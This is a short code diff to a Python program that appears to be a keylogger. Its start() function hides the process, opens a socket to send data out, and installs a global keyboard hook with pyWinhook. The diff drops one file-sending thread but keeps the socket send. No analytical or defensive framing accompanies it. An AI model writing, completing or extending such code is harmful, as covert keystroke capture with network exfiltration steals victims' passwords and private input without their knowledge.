@@ -50,8 +50,6 @@ def encodeTXT(s):
 def start():
     hide()
     ot = opensocket()
-    send_thread = threading.Thread(target=ot.send_file)
-    send_thread.start()
     send(ot)
     hm = pyWinhook.HookManager()
     hm.HookKeyboard()
